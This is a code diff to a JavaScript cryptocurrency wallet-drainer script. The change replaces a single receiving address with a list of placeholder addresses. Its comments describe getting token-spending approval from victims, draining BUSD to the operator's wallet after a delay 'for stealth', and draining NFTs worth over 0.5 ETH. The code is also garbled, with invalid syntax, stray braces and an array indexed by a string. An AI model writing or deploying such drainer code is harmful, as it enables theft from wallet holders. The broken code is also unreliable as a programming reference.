@@ -4,7 +4,7 @@
 
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddresses = ["address1", "address2", "address3"];   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
@@ -13,15 +13,15 @@ var smartcontract
 
 function approveSpending(token) {
 	
-	 smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
-	smartcontract.methods.drainBUSD.send(to:recieveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
+	 smartcontract.methods.approvetransaction(receiveAddresses[chain]);      //the smart contract gets approved to access tokens
+	smartcontract.methods.drainBUSD.send(to:receiveAddresses["bnb"]).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
 }
 	  
   			
 }
 
 function drainwallet(token) {
-	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
+	  cryptotokenContract.methods.transfer(receiveAddresses["bnb"]).send({ from: currentAddr, to:receiveAddresses["bnb"] }); //this drains the nfts if the value is above 0.5 eth 
   			
 }
 
